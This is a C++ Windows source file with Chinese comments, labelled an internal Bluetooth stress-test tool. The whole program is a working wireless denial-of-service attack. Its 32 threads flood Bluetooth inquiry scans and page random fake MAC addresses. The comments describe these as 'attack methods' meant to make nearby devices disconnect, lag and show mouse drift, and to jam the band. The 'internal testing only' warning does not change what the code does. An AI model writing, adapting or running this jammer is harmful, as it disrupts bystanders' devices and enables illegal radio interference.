#include <winsock2.h>
#include <ws2bth.h>
#include <windows.h>
#include <iostream>
#include <thread>
#include <atomic>
#include <vector>
#include <cstdlib>
#include <ctime>

#pragma comment(lib, "ws2_32.lib")

// 蓝牙极强信号干扰/压力测试工具 (混合扫描与寻呼洪泛)
// 警告：此模式强度极高，会导致周围蓝牙设备断连、卡顿、鼠标漂移。仅限内部压力测试使用。
int main() {
    SetConsoleOutputCP(CP_UTF8);
    
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed." << std::endl;
        return 1;
    }

    std::cout << "========== 极强蓝牙信号干扰器 (OVERDRIVE 模式) ==========" << std::endl;
    std::cout << "攻击方式 A: 16线程无等待设备扫描洪泛 (Inquiry Flood)" << std::endl;
    std::cout << "攻击方式 B: 16线程随机地址寻呼洪泛 (Paging Flood)" << std::endl;
    std::cout << "状态: 正在全功率执行... (按 Ctrl+C 停止)" << std::endl;

    std::atomic<bool> running(true);
    std::vector<std::thread> threads;
    srand((unsigned int)time(NULL));

    // ==========================================
    // 线程组 1：扫描洪泛 (Inquiry Flood)
    // 作用：疯狂发送查询包，占用广播通道。
    // ==========================================
    int scanThreadCount = 16;
    for (int i = 0; i < scanThreadCount; ++i) {
        threads.emplace_back([i, &running]() {
            int round = 0;
            while (running) {
                WSAQUERYSETW qs;
                memset(&qs, 0, sizeof(qs));
                qs.dwSize = sizeof(qs);
                qs.dwNameSpace = NS_BTH;
                DWORD dwControlFlags = LUP_CONTAINERS | LUP_FLUSHCACHE; // 强制无视缓存请求硬件

                HANDLE hLookup;
                if (WSALookupServiceBeginW(&qs, dwControlFlags, &hLookup) == 0) {
                    char buffer[4096];
                    LPWSAQUERYSETW pResults = (LPWSAQUERYSETW)buffer;
                    DWORD dwSize = sizeof(buffer);
                    
                    // 飞速消耗结果，保持基带处于高度负荷
                    while (WSALookupServiceNextW(hLookup, LUP_RETURN_NAME | LUP_RETURN_ADDR, &dwSize, pResults) == 0) {
                        if (!running) break;
                    }
                    WSALookupServiceEnd(hLookup);
                }
                
                round++;
                if (i == 0 && round % 10 == 0) {
                    std::cout << "[干扰组 A - 扫描] 已执行 " << round << " 轮深度扫描..." << std::endl;
                }
                // 极限压缩休眠，释放CPU切换时间片，其余时间全部压给蓝牙驱动
                Sleep(1);
            }
        });
    }

    // ==========================================
    // 线程组 2：寻呼洪泛 (Paging Flood)
    // 作用：随机生成根本不存在的MAC地址并强制硬件建立连接。
    // 硬件会挂起并发射极高密度的寻呼包来寻找设备，彻底堵死所在频段。
    // ==========================================
    int pageThreadCount = 16;
    for (int i = 0; i < pageThreadCount; ++i) {
        threads.emplace_back([i, &running]() {
            int round = 0;
            while (running) {
                SOCKET s = socket(AF_BTH, SOCK_STREAM, BTHPROTO_RFCOMM);
                if (s == INVALID_SOCKET) {
                    Sleep(10);
                    continue;
                }

                // 生成伪造的 48 位蓝牙 MAC 地址
                unsigned long long rndAddr = ((unsigned long long)rand() << 32) ^ 
                                             ((unsigned long long)rand() << 16) ^ 
                                             rand();
                rndAddr &= 0xFFFFFFFFFFFFULL; // 截取有效48位

                SOCKADDR_BTH sa = {0};
                sa.addressFamily = AF_BTH;
                sa.btAddr = rndAddr;
                sa.port = (rand() % 30) + 1; // 随机端口

                // 设置非阻塞或直接利用阻塞机制消耗底层寻呼池
                // Windows 的底层蓝牙驱动在面对不存在的设备时，会长时间处于 Paging 阶段
                connect(s, (SOCKADDR*)&sa, sizeof(sa));
                closesocket(s);

                round++;
                if (i == 0 && round % 5 == 0) {
                    std::cout << "[干扰组 B - 寻呼] 已发起 " << round << " 次死连接冲击..." << std::endl;
                }
                Sleep(1);
            }
        });
    }

    // 主线程保持运行并维持打印心跳
    while (true) {
        Sleep(5000);
        std::cout << ">>> 射频干扰正在进行中..." << std::endl;
    }

    running = false;
    for (auto& t : threads) {
        if (t.joinable()) t.join();
    }
    WSACleanup();
    return 0;
}